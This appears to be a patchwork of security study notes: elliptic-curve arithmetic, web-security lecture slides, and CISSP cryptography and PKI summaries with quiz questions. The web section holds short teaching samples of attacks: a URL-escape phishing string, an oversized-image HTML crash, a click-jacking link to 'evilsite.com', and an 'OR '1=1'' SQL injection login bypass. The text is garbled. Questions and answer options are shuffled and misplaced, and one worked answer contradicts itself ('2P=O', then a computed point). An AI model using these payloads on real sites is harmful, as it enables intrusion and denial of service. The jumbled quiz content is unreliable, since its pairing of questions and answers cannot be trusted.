 s = (yP- yQ) / (xP- xQ) = (-4 - 0) / (0 - 1) = 4 xR= s2- xP- xQ= 16 - 0 - 1 = 15
and
yR= -yP+ s(xP- xR) = 4 + 4(0 - 15) = -56 Thus P + Q = (15, -56)
6.
    In the elliptic curve group defined by y2= x3- 17x + 16 over real
numbers, what is 2P if P = (4, 3.464)?
 2P=O
S = (3XP^2 + a) / (2YP )  XR = S^2 - 2XP,
YR = -YP + S(XP - XR)
From the Doubling formulae:
 s = (3xP^2+ a) / (2yP) = (3*(4)2+ (-17)) / 2*(3.464) = 31 / 6.928 = 4.475 xR= s2- 2xP= (4.475)2- 2(4) = 20.022 - 8 = 12.022
and
Thus 2P = (12.022, -39.362)
  yR= -yP+ s(xP- xR) = -3.464 + 4.475(4 - 12.022) = - 3.464 - 35.898 =
-39.362
 ### web security
HTML Hypertext markup language
– Describes the content and formatting of Web pages. – Rendered within browser window
HTML features
Static document description language
Supports linking to other pages and embedding images by reference User input sent to server via forms
HTML extensions
Additional media content (e.g., PDF, video) supported through plugins Embedding programs in supported languages (e.g., JavaScript, Java)
provides dynamic content that interacts with the user, modifies the browser user interface, and can access the client computer environment
Phishing
Forged web pages created to fraudulently acquire sensitive information
User typically solicited to access phished page from spam email
Most targeted sites
Financial services (e.g., Citibank) Payment services (e.g., PayPal) Auctions (e..g, eBay)
45K unique phishing sites detected monthly in 2009
Methods to avoid detection Misspelled URL
URL obfuscation
Removed or forged address bar URL Obfuscation
Properties of page in previous slide
  - Actual URL different from spoofed URL displayed in address
bar
URL escape character attack
  - Old versions of Internet Explorer did not display anything past the Esc or null character。
  - Displayed vs. actual site http://trusted.com%01%00@malicious.com
Unicode attack
  - Domains names with Unicode characters can be registered
  - Identical, or very similar, graphic rendering for some characters
  - E.g., Cyrillic and Latin “a”
  - Phishing attack on paypal.com
  - Current version of browsers display Punycode, an ASCII-
encoded version of Unicode: www.xn--pypal-4ve.com
IE Image Crash
Browser implementation bugs can lead to denial of service attacks The classic image crash in Internet Explorer is a perfect example
  - By creating a simple image of extremely large proportions, one can crash Internet Explorer and sometimes freeze a Windows machine
  - <HTML>
  - <BODY>
  - <IMG SRC="./imagecrash.jpg" width="9999999" height="9999999">
  - </BODY>   - </HTML>
Variations of the image crash attack still possible on the latest IE version.
Mobile Code Executable program
Sent via a computer network Executed at the destination
Examples:
– JavaScript (different from java)
– ActiveX
– Java Plugins
– Integrated Java Virtual Machines
JavaScript
Scripting language interpreted by the browser Code enclosed within <script> ... </script> tags
Defining functions:
<script type="text/javascript">
   function hello() { alert("Hello world!"); }
</script>
Event handlers embedded in HTML
<img src="picture.gif"
    onMouseOver="javascript:hello()">
Built-in functions can change content of
window window.open("http://brown.edu")
Click-jacking attack
    <a onMouseUp="window.open(′http://
    www.evilsite.com′)" href="http://
    www.trustedsite.com/">Trust me!</a>
Cookies
Cookies are a small bit of information stored on client side computer associated with a specific server.
– When you access a specific website, it might store information as a cookie
– Every time you revisit that server, the cookie is re-sent to the server – Effectively used to hold state information over sessions
Cookies can hold any type of information – Can also hold sensitive information
- includes passwords, credit card information, social security number, etc.
- Session cookies, non-persistent cookies, persistent cookies
– Almost every large website uses cookies
Cookies are stored on your computer and can be controlled
– However, many sites require that you enable cookies in order to use the site
– Their storage on your computer naturally lends itself to exploits
– You should clear your cookies on a regular basis
– Most browsers will also have ways to turn off cookies, exclude certain sites from adding cookies, and accept only certain sites' cookies
Cookies expire
– The expiration is set by the sites' session by default, which is chosen by the server
– This means that cookies will probably stick around for a while
SQL Injection Attack
Many web applications take user input from a form
Often this user input is used literally in the construction of a SQL query submitted to a database.
example:
SELECT user FROM table WHERE name = ‘user_input’;
An SQL injection attack involves placing SQL statements in the user input
Standard Query Language
SQL lets you access and manage (Query) databases.
A database is a large collection of data organized in tables for rapid search and retrieval, with fields and columns. SQL Syntax
SELECT column_name(s) or *
FROM table_name
WHERE column_name operator value ORDER BY column_name ASC|DESC LIMIT starting row and number of lines
Login Authentication Query
- Standard query to authenticate users:
select * from users where user='$usern' AND pwd='$password'
- Classic SQL injection attacks
– Server side code sets variables $username and $passwd from user input to web form
– Variables passed to SQL query
select * from users where user='$username' AND pwd='$passwd'
- Special strings can be entered by attacker
select * from users where user='M' OR '1=1' AND pwd='M' OR '1=1'
- Result: access obtained without password CISSP
Chapter 6 ■ Cryptography and Symmetric Key Algorithms
Understand the role that confidentiality, integrity, and nonrepudiation play in cryptosystems.
Confidentiality is one of the major goals of cryptography. It protects the secrecy of data while it is both at rest and in transit.
Integrity provides the recipient of a message with the assurance that data was not altered (intentionally or unintentionally) between the time it was created and the time it was accessed.
Nonrepudiation provides undeniable proof that the sender of a message actually authored it. It prevents the sender from subsequently denying that they sent the original message.
Know how cryptosystems can be used to achieve authentication goals.
Authentication provides assurances as to the identity of a user. One possible scheme that uses authentication is the challenge-response protocol, in which the remote user is asked to encrypt a message using a key known only to the communicating parties. Authentication can be achieved with both symmetric and asymmetric cryptosystems.
Be familiar with the basic terminology of cryptography.
Exam Essentials When a sender wants to transmit a private message to a recipient, the sender takes the plaintext (unencrypted) message and encrypts it using an algorithm and a key. This produces a ciphertext message that is transmitted to the recipient. The recipient then uses a similar algorithm and key to decrypt the ciphertext and recreate the original plaintext message for viewing.
Understand the difference between a code and a cipher and explain the basic types of ciphers.
Codes are cryptographic systems of symbols that operate on words or phrases and are sometimes secret but don’t always provide confidentiality.
Ciphers are always meant to hide the true meaning of a message. Know how the following types of ciphers work: transposition ciphers, substitution ciphers (including one-time pads), stream ciphers, and block ciphers.
Know the requirements for successful use of a one-time pad.
For a one-time pad to be successful, the key must be generated randomly without any known pattern. The key must be at least as long as the message to be encrypted. The pads must be protected against physical disclosure, and each pad must be used only one time and then discarded.
Understand the concept of zero-knowledge proof.
Zero-knowledge proof is a communication concept.
A specific type of information is exchanged but no real data is transferred, as with digital signatures and digital certificates.
Understand split knowledge.
Split knowledge means that the information or privilege required to perform an operation is divided among multiple users. This ensures that no single person has sufficient privileges to compromise the security of the environment. M of N Control is an example of split knowledge. Understand work function (work factor).
Work function/factor, is a way to measure the strength of a cryptography system by measuring the effort in terms of cost and/or time to decrypt messages. Usually the time and effort required to perform a complete brute- force attack against an encryption system is what a work function rating represents. The security and protection offered by a cryptosystem is directly proportional to the value of its work function/factor.
Understand the importance of key security.
Cryptographic keys provide the necessary ele- ment of secrecy to a cryptosystem. Modern cryptosystems utilize keys that are at least 128 bits long to provide adequate security. It’s generally agreed that the 56-bit key of the Data Encryption Standard (DES) is no longer sufficiently long to provide security.
Know the differences between symmetric and asymmetric cryptosystems.
Symmetric key cryptosystems (or secret key cryptosystems) rely on the use of a shared secret key. They are much faster than asymmetric algorithms, but they lack support for scalability, easy
key distribution, and nonrepudiation. Asymmetric cryptosystems use public-private key pairs for communication between parties but operate much more slowly than symmetric algorithms.
Be able to explain the basic operational modes of the Data Encryption Standard (DES) and Triple DES (3DES).
◦ The Data Encryption Standard operates in 4 modes: Electronic Codebook (ECB) mode, Cipher Block Chaining (CBC) mode, Cipher Feedback (CFB) mode, and
Output Feedback (OFB) mode.
◦ ECB mode is considered the least secure and is used only for short messages.
◦ 3DES uses three iterations of DES with two or three different keys to increase the effective key strength to 112 or 168 bits, respectively. Know the Advanced Encryption Standard (AES).
The Advanced Encryption Standard (AES) uses the Rijndael algorithm and is the US government standard for the secure exchange of sensitive but unclassified data. AES uses key lengths of 128, 192, and 256 bits and a fixed block size of 128 bits to achieve a much higher level of security than that provided by the older DES algorithm.
How many possible keys exist in a 4-bit key space? XXXX 2^4= A. 4 B. 8 C. 16 D. 128
John recently received an email message from Bill. What cryptographic goal would need to be met to convince John that Bill was actually the sender of the message?
A. Nonrepudiation B. Confidentiality C. Availability D. Integrity
What is the length of the cryptographic key used in the Data Encryption Standard (DES) cryptosystem?
A. 56 bits
B. 128 bits
C. 192 bits
D. 256 bits
What type of cipher relies on changing the location of characters within a message to achieve confidentiality?
A. Stream cipher
B. Transposition cipher
C. Block cipher
D. Substitution cipher
 Which one of the following is not a possible key length for the Advanced Encryption Standard Rijndael cipher? A. 56 bits
B. 128 bits
C. 192 bits
D. 256 bits The Rijndael cipher allows users to select a key length of 128, 192, or 256 bits, depending on the specific security requirements of the application.
Which one of the following cannot be achieved by a secret key cryptosystem?
A. Nonrepudiation Nonrepudiation requires the use of a public key
cryptosystem
B. Confidentiality
C. Availability
D. Key distribution
When correctly implemented, what is the only cryptosystem known to be unbreakable?
A. Transposition cipher
B. Substitution cipher
C. Advanced Encryption Standard
D. One-time pad
What is the output value of the mathematical function 16 mod 3? A. 0 B. 1 C. 3 D. 5
A. Key values must be random.
  In the 1940s, a team of cryptanalysts from the United States successfully broke a Soviet code based on a one-time pad in a project known as VENONA. What rule did the Soviets break that caused this failure? B. Key values must be the same length as the message.
C. Key values must be used only once.
D. Key values must be protected from physical disclosure.
A. Stream cipher
B. Caesar cipher
C. Block cipher
D. ROT3 cipher
What is the minimum number of cryptographic keys required for secure two-way communications in symmetric key cryptography?
A. One B. Two C. Three D. Four
A. Split knowledge
B. M of N Control M of N Control requires that a minimum number of agents (M) out of the total number of agents (N) work together to perform high-security tasks.
C. Work function
D. Zero-knowledge proof
Which one of the following Data Encryption Standard (DES) operating modes can be used for large messages with the assurance that an error early in the encryption/decryption process won’t spoil results throughout the communication?
A. Cipher Block Chaining (CBC) error
B. Electronic Codebook (ECB) not large
 Which one of the following cipher types operates on large pieces of a message rather than individual characters or bits of a message?
 Dave is developing a key escrow system that requires multiple people to retrieve a key but does not depend on every participant being present. What type of technique is he using? C. Cipher Feedback (CFB) error D. Output Feedback (OFB)
A. It contains diffusion.
B. It contains confusion.
C. It is a one-way function. one-way function is a mathematical operation that easily produces output values for each possible combination of inputs but makes it impossible to retrieve the input values.
D. It complies with Kerchoff’s principle.
How many keys are required to fully implement a symmetric algorithm with 10 participants?
A. 10 B. 20 C. 45 D. 100 10x9/2
What block size is used by the Advanced Encryption Standard?
A. 32 bits
B. 64 bits
C. 128 bits The Advanced Encryption Standard uses a 128-bit block size, despite the fact that the Rijndael algorithm it is based on allows a variable block size.
D. V ariable
What kind of attack makes the Caesar cipher virtually unusable?
A. Meet-in-the-middle attack
B. Escrow attack
C. Frequency analysis attack
D. Transposition attack
 Many cryptographic algorithms rely on the difficulty of factoring the product of large prime numbers. What characteristic of this problem are they relying on? What type of cryptosystem commonly makes use of a passage from a well-known book for the encryption key?
A. Vernam cipher
B. Running key cipher
C. Skipjack cipher
D. Twofish cipher
19. Which AES finalist makes use of prewhitening and postwhitening techniques? A. Rijndael B. Twofish C. Blowfish D. Skipjack
20. How many encryption keys are required to fully implement an asymmetric algorithm with 10 participants?
A. 10 B. 20 C. 45 D. 100
Chapter 7 ■ PKI and Cryptographic Applications
Understand the key types used in asymmetric cryptography. Public keys are freely shared among communicating parties, whereas private keys are kept secret. To encrypt a message, use the recipient’s public key. To decrypt a message, use your own private key. To sign a message, use your own private key. To validate a signature, use the sender’s public key.
Be familiar with the three major public key cryptosystems.
RSA, the most famous public key cryptosystem, by Rivest, Shamir, and Adleman in
1977. It depends on the difficulty of factoring the product of prime numbers. El Gamal is an extension of the Diffie-Hellman key exchange algorithm that depends on modular arithmetic.
The elliptic curve algorithm depends on the elliptic curve discrete logarithm problem and provides more security than other algorithms when both are used with keys of the same length.
Know the fundamental requirements of a hash function. Good hash functions have 5 requirements. They must:
allow input of any length,
provide fixed-length output,
make it relatively easy to compute the hash function for any input, provide one-way functionality,
and be collision free.
Be familiar with the major hashing algorithms. The successors to the Secure Hash Algorithm (SHA), SHA-1 and SHA-2, make up the government standard message digest function. SHA-1 produces a 160-bit message digest whereas SHA-2 supports variable lengths, ranging up to 512 bits. SHA-3 remains in development and NIST may release it in final form soon.
Know how cryptographic salts improve the security of password hashing. When straightforward hashing is used to store passwords in a password file, attackers may use rainbow tables of precomputed values to identify commonly used passwords. Adding salts to the passwords before hashing them reduces the effectiveness of rainbow table attacks.
Understand how digital signatures are generated and verified. To digitally sign a message:
first use a hashing function to generate a message digest.
Then encrypt the digest with your private key.
To verify the digital signature on a message, decrypt the signature with the sender’s public key and then compare the message digest to one you generate yourself. If they match, the message is authentic.
Know the components of the Digital Signature Standard (DSS).
The Digital Signature Standard uses the SHA-1 and SHA-2 message digest functions along with one of three encryption algorithms: the Digital Signature Algorithm (DSA); the Rivest, Shamir, Adleman (RSA) algorithm; or the Elliptic Curve DSA (ECDSA) algorithm.
Understand the public key infrastructure (PKI). In the public key infrastructure, certificate authorities (CAs) generate digital certificates containing the public keys of system users. Users then distribute these certificates to people with whom they want to communicate. Certificate recipients verify a certificate using the CA’s public key.
Know the common applications of cryptography to secure email. The emerging standard for encrypted messages is the S/MIME protocol. Another popular email security tool is Phil Zimmerman’s Pretty Good Privacy (PGP). Most users of email encryption rely on having this technology built into their email client or their web- based email service.
Know the common applications of cryptography to secure web activity. The de facto standard for secure web traffic is the use of HTTP over Transport Layer Security (TLS) or the older Secure Sockets Layer (SSL). Most web browsers support both standards, but many websites are dropping support for SSL due to security concerns.
Know the common applications of cryptography to secure networking. The IPsec protocol standard provides a common framework for encrypting network traffic and is built into a number of common operating systems. In IPsec transport mode, packet contents are encrypted for peer-to-peer communication. In tunnel mode, the entire packet, including header information, is encrypted for gateway-to-gateway communications.
Be able to describe IPsec.
IPsec is a security architecture framework that supports secure communication over IP. IPsec establishes a secure channel in either transport mode or tunnel mode. It can be used to establish direct communication between computers or to set up a VPN between networks. IPsec uses two protocols: Authentication Header (AH) and Encapsulating Security Payload (ESP).
Be able to explain common cryptographic attacks. Brute-force attacks are attempts to randomly find the correct cryptographic key. Known plaintext, chosen ciphertext, and chosen plaintext attacks require the attacker to have some extra information in addition to the ciphertext. The meet-in-the-middle attack exploits protocols that use two rounds of encryption. The man-in-the-middle attack fools both parties into communicating with the attacker instead of directly with each other. The birthday attack is an attempt to
find collisions in hash functions. The replay attack is an attempt to reuse authentication requests.
Understand uses of digital rights management (DRM). Digital rights management (DRM) solutions allow content owners to enforce restrictions on the use of their content by oth- ers. DRM solutions commonly protect entertainment content, such as music, movies, and e-books but are occasionally found in the enterprise, protecting sensitive information stored in documents.
In the RSA public key cryptosystem, which one of the following numbers will always be largest?
A.e B.nC.pD.q
Which cryptographic algorithm forms the basis of the El Gamal cryptosystem?
A. RSA B. Diffie-Hellman C. 3DES D. IDEA
If Richard wants to send an encrypted message to Sue using a public key
cryptosystem, which key does he use to encrypt the message?
A. Richard’s public key
B. Richard’s private key (If he encrypted it with his own private key, any user could decrypt the message using Richard’s freely available public key. )
A. Sue’s public key
B. Sue’s private key
If a 2,048-bit plaintext message were encrypted with the El Gamal public key cryptosystem, how long would the resulting ciphertext message be? A. 1,024 bits
B. 2,048 bits
C. 4,096 bits
D. 8,192 bits
Acme Widgets currently uses a 1,024-bit RSA encryption standard companywide. The company plans to convert from RSA to an elliptic curve cryptosystem. If it wants to maintain the same cryptographic strength, what ECC key length should it use?
A. 160 bits 1,024-bit RSA key is cryptographically equivalent to a 160- bit elliptic curve cryptosystem key.
B. 512 bits
C. 1,024 bits
D. 2,048 bits
John wants to produce a message digest of a 2,048-byte message he plans to send to Mary. If he uses the SHA-1 hashing algorithm, what size will the message digest for this particular message be?
A. 160 bits
B. 512 bits
C. 1,024 bits
D. 2,048 bits
Which one of the following technologies is considered flawed and should no longer be used?
A. SHA-2 B. PGP C. WEP D. TLS
What encryption technique does WPA use to protect wireless communications? A. TKIP B. DES C. 3DES D. AES (WPA2)
Richard received an encrypted message sent to him from Sue. Which key should
he use to decrypt the message?
A. Richard’s public key
B. Richard’s private key
C. Sue’s public key
D. Sue’s private key
Richard wants to digitally sign a message he’s sending to Sue so that Sue can be sure the message came from him without modification while in transit. Which key should he use to encrypt the message digest?
A. Richard’s public key
B. Richard’s private key
C. Sue’s public key
D. Sue’s private key
Which one of the following algorithms is not supported by the Digital Signature Standard?
A. Digital Signature Algorithm
B. RSA
C. El Gamal DSA
D. Elliptic Curve DSA
Which International Telecommunications Union (ITU) standard governs the creation and
endorsement of digital certificates for secure electronic communication? A. X.500
B. X.509
C. X.900 D. X.905
13. What cryptosystem provides the encryption/decryption technology for the commercial version of Phil Zimmerman’s Pretty Good Privacy secure email system?
A. ROT13
B. IDEA
C. ECC
D. El Gamal
14. What TCP/IP communications port is used by Transport Layer Security traffic?
A. 80
B. 220 C. 443 D. 559
16. What type of cryptographic attack rendered Double DES (2DES) no more effective than standard DES encryption?
A. Birthday attack
B. Chosen ciphertext attack
C. Meet-in-the-middle attack
D. Man-in-the-middle attack
17. Which of the following tools can be used to improve the effectiveness of a brute-force password cracking attack?
A. Rainbow tables B. Hierarchical screening
C. TKIP
D. Random enhancement
18. Which of the following links would be protected by WPA encryption?
A. Firewall to firewall
B. Router to firewall
C. Client to wireless access point
D. Wireless access point to router
19. What is the major disadvantage of using certificate revocation lists?
A. Key management
B. Latency
C. Record keeping
D. Vulnerability to brute-force attacks
20. Which one of the following encryption algorithms is now considered insecure?
A. El Gamal
B. RSA
C. Skipjack
D. Merkle-Hellman Knapsack
20. What does IPsec define?
A. All possible security classifications for a specific configuration B. A framework for setting up a secure communication channel
C. The valid transition states in the Biba model
D. TCSEC security categories
3,501
